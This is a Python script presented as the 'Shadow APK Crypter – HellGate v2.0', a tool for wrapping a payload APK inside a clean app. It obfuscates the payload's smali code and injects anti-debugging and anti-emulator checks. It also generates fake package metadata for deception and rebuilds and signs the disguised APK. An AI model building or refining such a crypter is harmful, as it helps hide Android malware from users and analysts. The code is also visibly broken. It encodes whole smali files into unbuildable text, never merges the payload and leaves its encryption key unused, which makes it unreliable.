import os, shutil, subprocess, argparse, uuid, random, string, base64, hashlib
from colorama import Fore, Style
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def generate_key():
    return Fernet.generate_key()

def encrypt_data(data, key):
    f = Fernet(key)
    return f.encrypt(data.encode())

def decrypt_data(encrypted_data, key):
    f = Fernet(key)
    return f.decrypt(encrypted_data).decode()

def obfuscate_string(s):
    # Obfuscate strings using Base64 and XOR
    key = random.randint(1, 255)
    encoded = base64.b64encode(s.encode()).decode()
    xored = ''.join(chr(ord(c) ^ key) for c in encoded)
    return base64.b64encode(xored.encode()).decode()

def deobfuscate_string(s, key):
    # Deobfuscate strings
    decoded = base64.b64decode(s).decode()
    xored = ''.join(chr(ord(c) ^ key) for c in decoded)
    return base64.b64decode(xored).decode()

def generate_fake_metadata():
    # Generate fake metadata for deception
    fake_package = ''.join(random.choices(string.ascii_lowercase, k=8))
    fake_version = f"{random.randint(1,9)}.{random.randint(0,9)}.{random.randint(0,9)}"
    return fake_package, fake_version

def inject_anti_debug():
    # Inject anti-debugging protection code
    anti_debug_code = """
    .method public static checkDebug()V
        .locals 2
        invoke-static {}, Landroid/os/Debug;->isDebuggerConnected()Z
        move-result v0
        if-eqz v0, :cond_0
        invoke-static {}, Ljava/lang/System;->exit(I)V
        :cond_0
        return-void
    .end method
    """
    return anti_debug_code

def inject_anti_vm():
    # Inject anti-emulator protection code
    anti_vm_code = """
    .method public static checkVM()V
        .locals 2
        const-string v0, "ro.kernel.qemu"
        invoke-static {v0}, Landroid/os/SystemProperties;->get(Ljava/lang/String;)Ljava/lang/String;
        move-result-object v0
        const-string v1, "1"
        invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
        move-result v0
        if-eqz v0, :cond_0
        invoke-static {}, Ljava/lang/System;->exit(I)V
        :cond_0
        return-void
    .end method
    """
    return anti_vm_code

def banner():
    print(Fore.RED + """
     ███████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗
     ██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝
     ███████╗███████║███████║██║  ██║█████╔╝ 
     ╚════██║██╔══██║██╔══██║██║  ██║██╔═██╗ 
     ███████║██║  ██║██║  ██║██████╔╝██║  ██╗
     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
          Shadow APK Crypter – HellGate v2.0
          [🔥] Level 999999 Encryption [🔥]

     Website: https://www.shadowhackr.com/
     Facebook: https://www.facebook.com/Tareq.DJX/
     moPDF: https://www.mopdf.com/

     © 2024 Shadow Hacker. All rights reserved.
    """ + Style.RESET_ALL)

def run(cmd):
    print(Fore.YELLOW + f"[RUN] {cmd}" + Style.RESET_ALL)
    subprocess.run(cmd, shell=True)

def main(payload, template, name, icon, out):
    banner()
    id = str(uuid.uuid4())[:8]
    print(Fore.CYAN + "[*] Starting HellGate encryption process..." + Style.RESET_ALL)

    # Generate encryption keys
    encryption_key = generate_key()
    print(Fore.GREEN + "[✓] Generated encryption keys" + Style.RESET_ALL)

    # Step 1: Decode payload APK
    run(f"apktool d {payload} -o tmp/payload_{id}")

    # Step 2: Decode wrapper APK
    run(f"apktool d {template} -o tmp/wrapper_{id}")

    # Step 3: Obfuscate and encrypt files
    print(Fore.CYAN + "[*] Obfuscating and encrypting files..." + Style.RESET_ALL)
    for root, dirs, files in os.walk(f"tmp/payload_{id}/smali"):
        for file in files:
            if file.endswith('.smali'):
                file_path = os.path.join(root, file)
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                # Obfuscate strings in code
                obfuscated = obfuscate_string(content)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(obfuscated)

    # Step 4: Inject protection code
    print(Fore.CYAN + "[*] Injecting protection code..." + Style.RESET_ALL)
    protection_code = inject_anti_debug() + "\n" + inject_anti_vm()
    with open(f"tmp/wrapper_{id}/smali/com/protection/Protection.smali", 'w') as f:
        f.write(protection_code)

    # Step 5: Generate fake metadata
    fake_package, fake_version = generate_fake_metadata()
    print(Fore.GREEN + f"[✓] Generated fake metadata: {fake_package} v{fake_version}" + Style.RESET_ALL)

    # Step 6: Build new APK
    run(f"apktool b tmp/wrapper_{id} -o tmp/{name}_{id}_unsigned.apk")

    # Step 7: Sign the APK
    run(f"apksigner sign --ks debug.keystore --ks-pass pass:android "
        f"--key-pass pass:android --out output/{out} tmp/{name}_{id}_unsigned.apk")

    print(Fore.GREEN + f"[✓] HellGate encryption complete! Output: output/{out}" + Style.RESET_ALL)
    print(Fore.RED + "[!] Remember: With great power comes great responsibility!" + Style.RESET_ALL)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Shadow APK Crypter – HellGate v2.0")
    parser.add_argument("--payload", required=True, help="Payload APK path")
    parser.add_argument("--template", required=True, help="Clean app APK path")
    parser.add_argument("--name", required=True, help="App name")
    parser.add_argument("--icon", required=False, help="App icon (not yet implemented)")
    parser.add_argument("--out", default="shadow_output.apk", help="Output APK name")

    args = parser.parse_args()
    main(args.payload, args.template, args.name, args.icon, args.out)
